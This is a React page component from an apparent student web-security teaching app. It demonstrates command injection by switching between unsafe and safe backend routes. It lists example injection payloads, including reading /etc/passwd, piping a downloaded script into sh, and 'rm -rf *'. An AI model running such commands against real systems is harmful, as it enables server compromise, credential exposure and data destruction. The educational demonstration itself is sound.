/// House Keeping ///
// Name: Warren Kavanagh 
// Email: C16463344@MyTUDublin.ie
// Description:
//  Component used for the command injection screen 

// Imports //
import {useState} from 'react';
import axios from 'axios';

/// Bootstrap ///
import { Col,Button, Form, Container, Row, InputGroup,FormControl} from 'react-bootstrap';

/// Components ///
import MessageAlert from '../components/widgets/MessageAlert';
import Commands from '../components/widgets/Commands';

function CommandInjection(){
    /// API Urls for good and bad calls 
    const badAPIRoute  = `${process.env.REACT_APP_API_URL}/unsafe/commandinjection`;
    const goodAPIRoute = `${process.env.REACT_APP_API_URL}/safe/commandinjection`;

    /// Commands ///
    // Passed to the commands component for explanations of commands 
    const commands ={
        title:"Malicious Linux Commands",
        commands: [
            {command:";",explanation:"Allows for multiple commands to be executed, if this does not throw an error there is possibility commands can be injected."},
            {command:"; echo \"Hello\"", explanation:"Tests if code can be injected by using a simple echo command, if the result of echo is returned to the client then commands can be executed."},
            {command:"; pwd", explanation:"Print the current working directory to see where in the file system the server is running."},
            {command:"; mkdir <dir>", explanation:"Can create directorys on the server machine."},
            {command:"; cat /etc/passwd", explanation:"Print out the contents of the passwd file on linux containing sensitive user information."},
            {command:"; ps aux", explanation:"Print out information on the current processes running on the machine."},
            {command:"; wget <url> | sh", explanation:"Download a script from a url and execute it using sh, does not have to be a shell script if other programming languages installed."},
            {command:"; sleep <Secs>s <Mins>m <Hours>h <Days>d", explanation:"Will cause the server to pause for a certain period of time."},
            {command:"; rm -rf *", explanation:"Remove all folders and subfolders from current directory."}
        ]
    } 

    /// State ///
    // apiURL   - Used to change between unsafe and safe mode for API call, default to unsafe
    // folder   - User entered data from folder search box
    // response - API response, used to display in table 
    // error    - Used to display errors returned from API 
    const [apiURL, setApiURL]     = useState(badAPIRoute);    
    const [folder, setFolder]   = useState('');
    const [response, setResponse] = useState();
    const [error, setError]       = useState();


    /// handleToggle ///
    // Description:
    //  Called when the "Safe Mode" button is clicked, used to toggle between the API route
    //  suciptible to injection attack and the fix 
    function handleToggle(event){
        if(apiURL === badAPIRoute){
            setApiURL(goodAPIRoute);
            console.log("CHANGE TO SAFE",apiURL);
        }else{
            setApiURL(badAPIRoute);
            console.log("CHANGE TO UNSAFE",apiURL);
        }
    }

    /// handleSearch ///
    // Description:
    //  Called when a user clicks the search button to search for a product 
    //  This sends an API request to the backend to get data and the response is then set to
    //  response state so it can be shown in the table 
    const handleSearch = async (event) => {
        try{
            setResponse();
            setError();
            let request = {
                method: 'get',
                url: apiURL,
                params: {folder: folder}
            }
            console.log(request)
            let res = await axios(request);
            console.log(res)
            setResponse(res.data);
        }catch(error){
            console.log(error.response.data)
            setError(error.response.data.errormessage);
        }        
    };

    return(
        <Container>
            <h1>Command Injection</h1>
            <p>
                This page demonstrates a command injection attack. The search box below is inteneded to search directorys and 
                list out the contents of these directorys, for example entering "data" will show all the files in the data directory.
                However malicous commands can be placed in the search box and will be executed by the server causing harmful results.
            </p>
            <Commands data={commands}/>
            <Row md={3} xs={1}>
                <Col>
                <Form.Check 
                    type="switch"
                    label="Safe Mode"
                    onChange={handleToggle}
                />
                </Col>
                <Col>
                <InputGroup className="mb-3">
                    <FormControl
                        placeholder="data"
                        onChange={(event) => setFolder(event.target.value)}
                    ></FormControl>
                <Button
                    onClick={handleSearch}
                    variant="secondary"
                >Search</Button>    
                
                </InputGroup>
                </Col>
            </Row>
            {error && <MessageAlert variant='danger'>{error}</MessageAlert>}
            {typeof response !==  "undefined" &&
                <>{response} </>
            }
            
        </Container>
        
    );
}

export default CommandInjection;